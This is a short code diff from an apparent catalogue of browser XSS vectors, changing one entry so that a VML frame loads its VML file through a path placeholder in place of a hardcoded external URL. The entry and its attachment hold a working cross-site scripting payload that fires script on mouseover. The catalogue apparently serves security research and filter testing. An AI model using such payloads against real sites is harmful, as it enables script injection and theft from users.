@@ -1035,11 +1035,11 @@ var items =
             'ru' : 'VML фрейм с помещенным в него VML объектом плюс onmouseover',
             'de' : ''
         },
-        'data'       : '<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=http://heideri.ch/jso/test.vml#xss></vmlframe>',
+        'data'       : '<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%vml_path%#xss></vmlframe>',
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '0',            
-            'path'          : 'http://heideri.ch/jso/test.vml',
+            'path'          : '',
             'name'          : 'test.vml',
             'raw'           : '<xml><rect style="height:100%;width:100%" id="xss" onmouseover="%js_alert%" strokecolor="white" strokeweight="2000px" filled="false" /></xml>'
         },
